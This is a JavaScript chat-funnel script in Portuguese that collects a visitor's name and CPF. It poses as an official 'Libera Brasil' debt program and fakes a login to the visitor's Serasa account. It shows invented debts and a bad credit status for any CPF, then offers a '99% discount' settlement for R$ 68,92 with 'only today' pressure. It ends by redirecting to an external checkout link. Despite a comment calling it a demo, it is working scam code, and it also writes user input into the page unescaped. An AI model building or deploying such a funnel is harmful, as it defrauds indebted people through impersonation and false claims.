/*
=========================================================
CHAT PROTÓTIPO — FLUXO COMPLETO
=========================================================

- Nome e CPF vêm do index.html
- Todas as mensagens automáticas aguardam pelo menos 3s
- Áudios aguardam terminar antes da próxima etapa
- Imagens e áudios estão marcados para substituição
- Pagamento integrado ao Mercado Pago via backend
- Purchase somente após pagamento realmente aprovado

=========================================================
*/

/*DEIXAR CLARO QUE ESSE PROGRAMA É OBVIAMENTE UMA DEMO SOMENTEPARA TESTE E 
AS INFORMACOES INFORMACADAS SAO COMPLETAMENTE FICCTICAS E NADA LEVADA A SERIO*/

/*
=========================================================
DADOS DO USUÁRIO
=========================================================
*/

const userName =
    sessionStorage.getItem("chat_demo_name") || "Usuário";

const userCpf =
    sessionStorage.getItem("chat_demo_cpf") || "000.000.000-00";


/*
=========================================================
CONFIGURAÇÕES
=========================================================
*/

const WAIT_TIME = 2000;

const chat =
    document.getElementById("chat");


/*
=========================================================
API
=========================================================
*/

const API_CRIAR_PAGAMENTO =
    "api/criar_pagamento.php";

const API_CONSULTAR_PAGAMENTO =
    "api/consultar_pagamento.php";


/*
=========================================================
CONFIGURAÇÃO DO PAGAMENTO
=========================================================
*/

/*
    O valor REAL é definido no backend.

    O valor abaixo serve apenas para exibição
    e eventos de rastreamento no frontend.

    O backend continua sendo a autoridade
    sobre o valor cobrado.
*/

const VALOR_PROPOSTA = 68.92;


/*
=========================================================
UTILITÁRIOS
=========================================================
*/

function wait(ms = WAIT_TIME) {

    return new Promise(resolve => {

        setTimeout(resolve, ms);

    });

}


function scrollChat() {

    setTimeout(() => {

        chat.scrollTo({

            top: chat.scrollHeight,

            behavior: "smooth"

        });

    }, 100);

}


/*
=========================================================
INDICADOR DIGITANDO
=========================================================
*/

function showTyping() {

    const typing =
        document.createElement("div");

    typing.className =
        "typing-indicator";

    typing.id =
        "typing-indicator";

    typing.innerHTML = `

        <span></span>
        <span></span>
        <span></span>

    `;

    chat.appendChild(typing);

    scrollChat();

    return typing;

}


function removeTyping() {

    const typing =
        document.getElementById(
            "typing-indicator"
        );

    if (typing) {

        typing.remove();

    }

}


/*
=========================================================
MENSAGEM DO ATENDENTE
=========================================================
*/

async function addMessage(
    text,
    options = {}
) {

    const {

        waitBefore = WAIT_TIME,

        typing = true

    } = options;


    if (waitBefore > 0) {

        await wait(waitBefore);

    }


    let typingElement = null;


    if (typing) {

        typingElement =
            showTyping();

        await wait(1200);

        if (typingElement) {

            typingElement.remove();

        }

    }


    const message =
        document.createElement("div");


    message.className =
        "message attendant-message";


    const formatted =
        text

            .replace(
                /\*\*(.*?)\*\*/g,
                "<strong>$1</strong>"
            )

            .replace(
                /\n/g,
                "<br>"
            );


    message.innerHTML =
        formatted;


    chat.appendChild(message);

    scrollChat();

    return message;

}


/*
=========================================================
MENSAGEM DO USUÁRIO
=========================================================
*/

function addUserMessage(text) {

    const message =
        document.createElement("div");


    message.className =
        "message user-message";


    message.innerHTML =
        text.replace(
            /\n/g,
            "<br>"
        );


    chat.appendChild(message);

    scrollChat();

}


/*
=========================================================
IMAGEM
=========================================================
*/

async function addImage(
    src,
    waitBefore = WAIT_TIME
) {

    await wait(waitBefore);


    const image =
        document.createElement("div");


    image.className =
        "chat-image";


    image.innerHTML = `

        <img
            src="${src}"
            alt="Imagem"
            loading="lazy"
            style="
                width: 100%;
                height: auto;
                object-fit: contain;
                display: block;
                border-radius: 12px;
            "
        >

    `;


    chat.appendChild(image);

    scrollChat();

    return image;

}


/*
=========================================================
BOTÕES
=========================================================
*/

async function addButtons(buttons) {

    await wait(WAIT_TIME);


    const container =
        document.createElement("div");


    container.className =
        "chat-buttons";


    buttons.forEach(buttonData => {

        const button =
            document.createElement("button");


        button.className =
            "chat-button";


        button.textContent =
            buttonData.text;


        button.addEventListener(
            "click",
            async () => {

                /*
                Remove toda a área de botões
                imediatamente após o clique.
                */

                container.remove();


                /*
                Mostra a escolha do usuário
                na conversa.
                */

                addUserMessage(
                    buttonData.text
                );


                /*
                Executa a próxima etapa.
                */

                if (
                    typeof buttonData.action ===
                    "function"
                ) {

                    await buttonData.action();

                }

            }
        );


        container.appendChild(button);

    });


    chat.appendChild(container);

    scrollChat();

    return container;

}

/*
=========================================================
VÍDEO
=========================================================
*/

async function addVideo(
    src,
    waitBefore = WAIT_TIME
) {

    await wait(waitBefore);

    const container =
        document.createElement("div");

    container.className =
        "chat-video";

    const video =
        document.createElement("video");

    video.controls = true;
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    video.preload = "auto";

    video.style.width = "100%";
    video.style.maxWidth = "320px";
    video.style.display = "block";
    video.style.margin = "0 auto 15px auto";
    video.style.borderRadius = "12px";

    video.src = src;

    container.appendChild(video);

    chat.appendChild(container);

    scrollChat();

    return container;
}

/*
=========================================================
ÁUDIO
=========================================================

Regra:

- Normalmente, só avança quando o áudio termina.
- Se o áudio apresentar erro, o fluxo continua.
- Se o autoplay for bloqueado e o usuário não iniciar,
  existe um tempo de segurança para não deixar o usuário travado.

=========================================================
*/

async function addAudio(
    src,
    waitBefore = WAIT_TIME
) {

    await wait(waitBefore);


    const container =
        document.createElement("div");


    container.className =
        "chat-audio";


    const audio =
        document.createElement("audio");


    audio.controls = true;

    audio.preload = "auto";

    audio.src = src;


    container.appendChild(audio);

    chat.appendChild(container);

    scrollChat();


    const FALLBACK_TIME = 15000;


    await new Promise(resolve => {

        let finished = false;

        let fallbackTimer;


        function finish() {

            if (finished) return;

            finished = true;

            clearTimeout(fallbackTimer);

            resolve();

        }


        audio.addEventListener(
            "ended",
            finish,
            {
                once: true
            }
        );


        audio.addEventListener(
            "error",
            finish,
            {
                once: true
            }
        );


        fallbackTimer =
            setTimeout(
                finish,
                FALLBACK_TIME
            );


        audio.play()
            .catch(() => {

                console.log(
                    "Autoplay bloqueado. " +
                    "Aguardando interação do usuário."
                );

            });

    });


    scrollChat();

    return container;

}


/*
=========================================================
INÍCIO DO CHAT
=========================================================
*/

async function startChat() {


    /*
    =====================================================
    IMAGEM 1
    =====================================================
    */

    await addImage(
        "./imagens/imagem2.jfif"
    );


    /*
    =====================================================
    MENSAGEM INICIAL
    =====================================================
    */

await addMessage(
    `Olá, **${userName}**, esse é um canal oficial de atendimento do Programa  **Libera Brasil** e os seus dados estão seguros conosco. 🔒`
);


    await addMessage(
        "Aguarde em alguns instantes, um de nossos atendentes entrará na conversa.."
    );

await addVideo(
    "audios/video.mp4"
);

    /*
    =====================================================
    CONFIRMAÇÃO DOS DADOS
    =====================================================
    */

    await addMessage(
        `Para continuar, confirme seus dados:

Nome: **${userName}**

CPF: **${userCpf}**`
    );


    /*
    =====================================================
    BOTÕES
    =====================================================
    */

    await addButtons([

        {

            text: "SIM, ESTÁ CORRETO",

            action: async () => {

                await fluxoConfirmacao();

            }

        },

        {

            text: "NÃO SOU EU",

            action: async () => {

                await addMessage(
                    "Os dados não foram confirmados. Atendimento encerrado."
                );

            }

        }

    ]);

}


/*
=========================================================
ETAPA 2 — CONFIRMAÇÃO
=========================================================
*/

async function fluxoConfirmacao() {


    await addMessage(
        "Obrigada!"
    );


    await addMessage(
        "Aguarde... Entrando em sua conta Serasa."
    );


    await addMessage(
        "**Login efetuado com sucesso!**"
    );


    await addMessage(
        `**${userName}**<br>Seja bem vindo(a) a sua conta Serasa.`
    );


    await addMessage(
        "Negocie suas dívidas com as empresas abaixo e diversas outras participantes do programa:"
    );


    /*
    =====================================================
    IMAGEM 6
    =====================================================
    */

    await addImage(
        "/imagens/imagem3.jfif"
    );


    /*
    =====================================================
    BOTÃO CONTINUAR
    =====================================================
    */

    await addButtons([

        {

            text: "CONTINUAR",

            action: async () => {

                await fluxoAudioInicial();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 3 — PRIMEIRO ÁUDIO
=========================================================
*/

async function fluxoAudioInicial() {


    /*
    ÁUDIO 1
    */

    await addAudio(
        "audios/audio1.mp3"
    );


    /*
    Só aparece depois do áudio terminar
    */

    await addButtons([

        {

            text: "SIM, QUERO NEGOCIAR",

            action: async () => {

                await fluxoAnalise();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 4 — ANÁLISE
=========================================================
*/

async function fluxoAnalise() {


    await addMessage(
        "Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..."
    );


    await addMessage(
        "Consultando.."
    );


    await addMessage(
        "**Análise concluída!**"
    );


    await addMessage(
        "Identificamos **dívidas ativas** no sistema. Os valores variam entre **R$ 1.728,74 a R$ 5.278,23** de dívida **em seu CPF.**"
    );


    /*
    =====================================================
    SITUAÇÃO DO CPF
    =====================================================
    */

await addMessage(
    `Situação para CPF:<br>
**${userCpf}**<br>
**NEGATIVADO**`
);


    await addMessage(
        "Segundo nossos registros, seu SCORE é considerado muito baixo **(alto risco para crédito):**"
    );


    /*
    IMAGEM SCORE
    */

    await addImage(
        "https://www.reisrevisional.com.br/wp-content/uploads/2021/05/Imagem_2-3.png"
    );


    await addMessage(
        "Você deseja verificar se existe algum acordo com desconto disponível para você?"
    );


    await addButtons([

        {

            text: "BUSCAR ACORDO",

            action: async () => {

                await fluxoAcordo();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 5 — BUSCAR ACORDO
=========================================================
*/

async function fluxoAcordo() {


    await addMessage(
        "Por favor, aguarde enquanto o sistema verifica as opções disponíveis para a você..."
    );


    await addMessage(
        "**Acordo encontrado!**"
    );


    await addMessage(
        `**1 (um) acordo foi encontrado para:**<br>

**NOME: ${userName}<br>**

**CPF: ${userCpf}**`
    );


    await addButtons([

        {

            text: "VER ACORDO",

            action: async () => {

                await fluxoVerAcordo();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 6 — VER ACORDO
=========================================================
*/

async function fluxoVerAcordo() {


    /*
    ÁUDIO 2
    */

    await addAudio(
        "audios/audio2.mp3"
    );


    await addMessage(
        `Parabéns **${userName}**<br>

Pode comemorar! Encontramos um **SUPER ACORDO DE 99% DE DESCONTO para você!**`
    );


    await addMessage(
        "Acessando o acordo **X1JI4-7KN--**..."
    );


    await addMessage(
        `Informações do acordo **X1JI4-7KN--** para **${userName}**<br>

(CPF: ${userCpf})`
    );


    await addMessage(
        `O contrato atual é válido apenas para o titular: **${userName}** portador(a) do CPF: **${userCpf}**`
    );


    await addMessage(
        "Você gostaria de realizar o seu acordo com **99% DE DESCONTO** para quitar **todas** as suas dívidas e ter seu nome limpo novamente por apenas **R$ 68,92**?"
    );


    await addButtons([

        {

            text: "CONFIRMAR O ACORDO E LIMPAR O NOME",

            action: async () => {

                await fluxoConfirmacaoAcordo();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 7 — CONFIRMAÇÃO DO ACORDO
=========================================================
*/

async function fluxoConfirmacaoAcordo() {


    /*
    ÁUDIO 3
    */

    await addAudio(
        "audios/audio3.mp3"
    );


    await addMessage(
        "**Acordo confirmado com sucesso!**"
    );


    await addButtons([

        {

            text: "CONTINUAR",

            action: async () => {

                await fluxoResumo();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 8 — RESUMO
=========================================================
*/

async function fluxoResumo() {


    /*
    ÁUDIO 4
    */

    await addAudio(
        "audios/audio4.mp3"
    );


    await addMessage(
        `Acordo confirmado: **X1JI4-7KN--!**<br>

Beneficiário(a):<br>

**${userName}**<br>

Identificação (CPF):<br>

**${userCpf}**<br>

**Quitação de todas as dívidas em ativo no CPF.**<br>

**895 Pontos no score.**<br>

Valor da proposta: **R$ 68,92**`
    );


    await addButtons([

        {

            text: "CONTINUAR PARA PAGAMENTO",

            action: async () => {

                await fluxoPagamentoAudio();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 9 — ÁUDIO ANTES DO PAGAMENTO
=========================================================
*/

async function fluxoPagamentoAudio() {


    /*
    ÁUDIO 5
    */

    await addAudio(
        "audios/audio5.mp3"
    );


    await addMessage(
        "**Atenção!** Oferta Válida Apenas para hoje."
    );


    await addMessage(
        "Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento"
    );


    await addButtons([

        {

            text: "REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME",

            action: async () => {

                await fluxoPagamento();

            }

        }

    ]);

}


/*
=========================================================
ETAPA 10 — PAGAMENTO
=========================================================
*/

async function fluxoPagamento() {

    /*
    =====================================================
    INFORMAÇÕES DA PROPOSTA
    =====================================================
    */

await addMessage(
    `**Proposta confirmada!**<br>
Beneficiário(a): **${userName}**<br>
CPF: **${userCpf}**<br>
Código da proposta: **X1JI4-7KN--**<br>
**Valor da proposta: R$ 68,92**`
);


    /*
    =====================================================
    REDIRECIONAMENTO PARA CHECKOUT
    =====================================================
    */

    await addMessage(
        "Aguarde enquanto preparamos o acesso ao pagamento..."
    );


    await wait(WAIT_TIME);


const CHECKOUT_URL =
    "https://pay.kiwify.com.br/KaqHOEX";


    window.location.href =
        CHECKOUT_URL;

}


/*
=========================================================
INICIALIZAÇÃO
=========================================================
*/

document.addEventListener(
    "DOMContentLoaded",
    () => {

        startChat();

    }
);